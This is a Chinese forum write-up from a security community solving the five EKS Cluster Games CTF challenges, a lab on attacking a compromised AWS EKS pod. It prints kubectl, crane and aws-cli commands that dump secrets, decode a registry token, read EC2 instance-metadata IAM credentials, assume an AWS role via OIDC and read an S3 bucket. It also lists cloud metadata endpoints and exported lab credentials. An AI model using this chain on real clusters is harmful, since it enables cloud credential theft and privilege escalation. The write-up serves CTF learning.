

# 奇安信攻防社区-初探云原生安全之EKS CLUSTER GAMES

### 初探云原生安全之EKS CLUSTER GAMES

AWS EKS（Elastic Kubernetes Service）是一种托管的Kubernetes服务，它简化了在AWS云环境中运行Kubernetes的过程。在EKS中，Pod是Kubernetes集群的基本执行单元。一个Pod可以包含一个或多个容器（例如Docker容器），这些容器通常紧密耦合并共享资源。

![image.png](assets/1704418348-448fe6e89745eda0cc2d8f1e42b0ffb3.png)  
yysy这个界面还是蛮好看的

AWS EKS（Elastic Kubernetes Service）是一种托管的Kubernetes服务，它简化了在AWS云环境中运行Kubernetes的过程。在EKS中，Pod是Kubernetes集群的基本执行单元。一个Pod可以包含一个或多个容器（例如Docker容器），这些容器通常紧密耦合并共享资源。

## challenge1

通过列出集群中所有的secrets来开始你的任务。你能在这些secrets中找到flag吗？  
![image.png](assets/1704418348-33e0221433d3e6e4436ffd1c43288fef.png)  
secrets有`get`和`list`权限

*kubectl get secrets log-rotate -o yaml*

-   `kubectl`：这是用于与Kubernetes集群交互的命令行工具。kubernetes Control
-   `get`：这个动作用于检索一个或多个资源。
-   `secrets`：指定你要检索的资源类型。在这个lab中，它是一个密钥，密钥是Kubernetes中用于存储敏感数据（如密码、OAuth令牌、SSH密钥等）的对象。
-   `log-rotate`：用来存储日志轮替相关的配置或凭据。日志轮替是一种常见的日志管理策略，用于定期替换旧的日志文件，以防止一个应用程序或服务的日志文件无限制地增长。
-   `-o yaml`：这个选项将命令的输出格式设置为YAML（又名标记语言）格式。YAML常用于Kubernetes中，因为它易读且易于在配置文件中使用。

![image.png](assets/1704418348-6b4bfc69cad83d7c16cf5cd423a3b0bf.png)

*kubectl get secrets -o yaml*  
这样也可以  
![image.png](assets/1704418348-621657249a9649ae3bed3b0a2b8c279e.png)

## challenge2

我们在研究过程中了解到：一定要检查container registries  
为方便起见，机器上已经预装了crane

![image.png](assets/1704418348-f899dc643903f4b39c850c781a03071c.png)  
这关没法直接list secrets  
尝试 kubectl get secrets -o yaml  
forbidden  
![image.png](assets/1704418348-049f1e1624b6ac52d34eea463a1e023a.png)

我们尝试  
kubectl get pods -o yaml  
看到了imagePullSecrets

在 Kubernetes 中，`imagePullSecrets` 是一个用于指定拉取私有容器镜像时所需的认证信息的机制。由于某些容器镜像存储在私有仓库中，访问这些镜像需要认证。`imagePullSecrets` 允许你为这些认证信息定义一个或多个 Secrets，然后在 Pod 的定义中引用它们，这样 Kubernetes 在创建 Pod 时就能使用这些 Secrets 来安全地拉取私有仓库中的镜像

![image.png](assets/1704418348-646cd2fa7ef23188688e69cd9e95b178.png)

kubectl get secrets registry-pull-secrets-780bab1d -o yaml  
![image.png](assets/1704418348-bbb40ad971b3231232cf4d966913b262.png)  
拿到dockerconfigjson  
![image.png](assets/1704418348-7c1e899f46fdbd2c28f8c0803643badc.png)  
auth字段拿出来再base64解码  
![image.png](assets/1704418348-62f49f1d6e71be36a34b28824a8100e8.png)

得到  
eksclustergames:dckr\_pat\_YtncV-R85mG7m4lr45iYQj8FuCo  
对应  
username:password  
直接登录

```php
crane auth login index.docker.io -u eksclustergames -p dckr_pat_YtncV-R85mG7m4lr45iYQj8FuCo

Crane is a tool for managing container images
```

![image.png](assets/1704418348-c4d5fabecb013c0aac7b058bc7491dce.png)  
读config 拿到flag  
记得要带镜像名base\_ext\_image

## challenge3

pod 的镜像承载的不仅仅是代码。深入其 ECR 资源库，检查图像层，揭开隐藏的秘密。  
记住：你在被入侵的 EKS pod 中。  
![image.png](assets/1704418348-77ba8d73c8c4356833d120afb48aa0e4.png)  
先看看  
kubectl get pods -o yaml  
![image.png](assets/1704418348-7ee45e5573d38452bd6e8a4654863af2.png)  
找到了ECR 但是没法连 需要凭据 接下来我们想办法搞凭据

Amazon Elastic Container Registry（ECR）是由亚马逊提供的一个容器镜像仓库服务。它允许用户存储、管理和部署 Docker 容器镜像。Amazon ECR 集成了 Amazon Web Services（AWS）的其他服务，提供了高度的可用性和安全性，支持私有仓库创建，并且能够与 Amazon Elastic Container Service（ECS）和 Amazon Elastic Kubernetes Service（EKS）等服务无缝协作。

因为EKS在EC2上 我们可以去尝试读EC2的元数据  
curl [http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole](http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole) | jq

169.254.169.254是aws厂商的元数据地址  
/latest/meta-data/iam/security-credentials/：这是访问实例的 IAM 角色信息的路径  
eks-challenge-cluster-nodegroup-NodeInstanceRole：这是 EC2 实例关联的特定 IAM 角色的名称  
![image.png](assets/1704418348-af7143f734ada8fb02fbe7566fe9e55d.png)

```php
常见的公有云厂商的元数据地址 转自@[Malaa]师傅
#AWS
http://instance-data
http://169.254.169.254
#Google Cloud
http://169.254.169.254
http://metadata.google.internal
http://metadata
#Azure
http://169.254.169.254
#Digital Ocean
http://169.254.169.254
#Packetcloud
https://metadata.packet.net
#Oracle Cloud
http://169.254.169.254
#Alibaba Cloud
http://100.100.100.200
#Tencent Cloud
http://metadata.tencentyun.com
http://169.254.0.23
```

读到aws的ak sk 可以直接用于ECR的登录  
我们使用aws-cli

```php
export AWS_ACCESS_KEY_ID=ASIA2AVYNEVM6EK2U6GS
export AWS_SECRET_ACCESS_KEY=/oE7RUuRIldHrxfk8uPHD+7/gPKZVesTvQcANHQG
export AWS_SESSION_TOKEN=FwoGZXIvYXdzEK///////////wEaDJx8atjAV4teYvF+pCK3ASejXBC4PcCltE+oO+eWIQPnOaAfs3P0B/fTZKt6BnpJeCMvQXjT/mTVVJofBZ3Z8Bz/e3R+ha0QsfoCS8iO2rTWqzxrelRuUV4RodrSZwxAtyTAuchkbz0lVRsX9yr9WbKCRkamcUP+Z0pTRJQboT+TpfuIbZANtUMr6jshx436iJFmm+1i+yRoHOvU5AorkRP74l8AjemM4SZu1PjnmZpwHz+kfylhz2MTuEoj3AqIADngngvbQSi8vJSsBjItrNOUmBK5XhIHPXruJAv16IPDb3NIX8ncRVK/05Jt/DFfM5nUwXBqDkVcte6p
```

aws ecr get-login-password|crane auth login 688655246681.dkr.ecr.us-west-1.amazonaws.com -u AWS --password-stdin  
crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central\_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01 | jq  
读配置拿到flag

## challenge4

你正在 EKS 集群上一个易受攻击的 pod 中。你的 pod 的服务帐户没有权限。你能通过导航访问 EKS 节点的权限服务帐户吗？  
请注意：出于保护 CTF 基础设施的安全考虑，该节点的权限受到限制

aws sts get-caller-identity （sts）AWS Security Token Service  
![image.png](assets/1704418348-e65748ef506cee56a0272be10fb26c57.png)  
看到了  
ARN（Amazon Resource Name）  
`arn:partition:service:region:account-id:resource`  
去拿eks的token  
aws eks get-token --cluster-name eks-challenge-cluster  
![image.png](assets/1704418348-67d1d5bdffb1bbfa3aec7d3a07b29efa.png)  
kubectl get secrets -o yaml --token=""  
填入值  
![image.png](assets/1704418348-2aa7058e0e29047c2db8ee5d94f3e882.png)  
拿到flag

## challenge5

您已成功从受限服务帐户过渡到节点服务帐户！干得好 下一个挑战是从 EKS 迁移到 AWS 账户。你能获得 s3access-sa 服务帐户的 AWS 角色并获得flag吗？  
![image.png](assets/1704418348-8e2957f2a496640d64ac9c5295fd98e0.png)  
从IAM POLICY中 我们可以知道flag在s3存储桶里  
![image.png](assets/1704418348-4c8576eb0057d937ffb82acd6a608c12.png)  
Trust POLICY中 给到了一个oidc服务  
![image.png](assets/1704418348-2af863e7b8d6cd5bee5679a252ef2225.png)  
在 Amazon Elastic Kubernetes Service (EKS) 中，OIDC（OpenID Connect）用于提供身份验证服务，使得 Kubernetes 集群可以与外部身份提供者（Identity Provider，IdP）集成。这允许 EKS 集群利用外部身份提供者进行用户认证和授权，从而实现更安全和灵活的访问控制。

```php
aws eks get-token --cluster-name eks-challenge-cluster
```

先拿到EKS 集群的token 马上要用

那我们现在就要创造有oidc权限的token

kubectl create token debug-sa --audience sts.amazonaws.com --token=""  
(必须加--audience sts.amazonaws.com 不然不能用)  
![image.png](assets/1704418348-3d8d6d72b2558ba32479df931adbe7bc.png)

拿到token以后去取AcckeyID SecretAccesskey sessiontoken

```php
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name payioad --web-identity-token ey******
```

-   `assume-role-with-web-identity`：这是 STS 服务中的一个 API 调用，用于请求临时的安全凭证。
    
-   `--role-arn`：角色的 Amazon Resource Name，指定要扮演的 IAM 角色。
    
-   `--role-session-name`：用于标识会话的名称，可以为任意值。
    
-   `--web-identity-token`：OIDC 令牌，用于证明身份验证的有效性。  
    ![image.png](assets/1704418348-cdeb4e2a1ad6bdce0ca36669e565f857.png)  
    取到以后就可以去美滋滋的登录了 \`\`\`php
    

export AWS\_ACCESS\_KEY\_ID=ASIA2AVYNEVMYUPBUWGM  
export AWS\_SECRET\_ACCESS\_KEY=lUFmyh0PxgngR6vxQflDz8KhkmUpgqGRbjew4XbN  
export AWS\_SESSION\_TOKEN=IQoJb3JpZ2luX2VjEJ///////////wEaCXVzLXdlc3QtMSJGMEQCIBBIwphU3MGQDHJeTANt7CzoD0srrazhQb9DlvF6RH1JAiANKsJKH9S+XcQ4hx8LZkMEvCB2nsW2ioCUNUhpz7mTdiq4BAgoEAAaDDY4ODY1NTI0NjY4MSIMbJuDUGASbIY9bPkgKpUEx9itB2uRz/Un0gAJruVquCJuXC/4wcSJilrfA6d8Bpkjswh77oNB11dg1pbSbscOv8E7324VKafB0c6RsMhiUshzT2u5h3DAk/usvkN/KaeoYJA8BPa3II6mzfNoJYpAUrecFcZblkeLVzrtpxhAhYg0I19qXebckFVDzIRh4qXGACN44SZjN1wvtZMFnBtLDNmiAf7wHaX8GpMjXf3tdDKxBamwG+Kkv9F5T2JPEDu9Gi69c+D/SaUnjrdnbK8HZR7fb1tr2hI2bsPN1yRGSJ4nwfplcGfOIkgRPxbi1bAk4ZSTEeftsnn7rf1ujb58quNUoJSfTZqybR7Ptqm+9ECz35eiUhNMfvF1ZdtAV3k25Oy1M0A5P28/rn5W5R7VAZ8/yEvhMQaYo836Hs1GpzIrl6B4YsYPf+j87Zm3KxgfrpbQ0h1DghTqspfuZR5CFIF0rl0CYUMb3/vB4wvtnsv1SQXQWXF40JYR9UoX+LDkLGkm9k3kHJDU1Tu6Jw6qTu6oa+62OfbTpzZpmdKFwiVDNhJctSymgQOX4eWWP4M/p2ko7IJrZzwkrT46u6WI6kFngQnuUd67KxAykE0DKsYHvBUn89XI+iU2gCbH/o+glEsq7CtBbM/vsOifAZ/OlGnQQ4SKKDcFyeZQ5IpZm0Fd+NXN5frpmHWknuxUEUd5WyShjFK7fK2/JhnKYCxcZeL03Ncw5diUrAY6lgG8cLRqGzz/gVRoGZJ+2oYI4Uf5+kf0zWZEzukPdjPMVpUHgPYJNife0pJhHnnipK9VOTcoo1Djkkh09WnzesiZxv8kYXxpKF/pILHEYWvg9Oc9bE6xs/pqhs37LlbQNxwhXuSCSRO/balKbG6ShZHDbj1bCjfsv57CoV8qbZOpdSenD8YrCe6kFD1g0Vq/SLmnbq9hOcY=

```php

要读flag的话必须复制到本地
aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag - | cat
![image.png](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-b119efccbc868f0b1c8f41b40a083f9c5b39871d.png)
复制flag到标准输出然后读 

完结撒花
![Qzufb5A5.png](https://shs3.b.qianxin.com/attack_forum/2023/12/attach-d232a5b8a1b9b0a15cb8962769e2c6263b4be4a3.png)
```
